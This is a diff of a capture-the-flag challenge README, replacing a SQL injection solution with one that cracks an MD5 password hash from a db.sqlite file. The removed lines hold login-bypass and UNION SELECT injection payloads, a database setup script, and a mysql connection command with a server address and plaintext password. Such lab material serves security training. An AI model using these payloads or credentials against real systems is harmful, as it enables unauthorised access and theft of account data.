@@ -1,29 +1,5 @@
-Goal - to get data and login / password for mysql server
+Goal - to get the flag from web app (index.html and process.php files)
 
-1) access to data:
-    login: login' OR 1=1; #
-    password: any
-2) access to users table:
-    login: ' union select login from users order by 1 DESC; #
-    or
-    ' union select pass from users order by 1 DESC; #
-    password: any
-
-# Use DB:
-
-DROP DATABASE IF EXISTS test;
-
-CREATE DATABASE test;
-
-CREATE TABLE users (
-   id INTEGER AUTO_INCREMENT,
-   login varchar(255),
-   pass varchar(255),
-   data varchar(255),
-   PRIMARY KEY(id)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8;
-
-INSERT INTO users VALUES(NULL,'login','pass','goto A');
-
-to connect:
-mysql -u user -h 46.37.146.33 -P 7306 -pqwerty123
+Way to solwe:
+You are provided with db.sqlite file, that is contains login and md5 encrypted password.
+You just need to decrypt this md5 hash using any online decryptor and login into web app, where you can fint your flag.
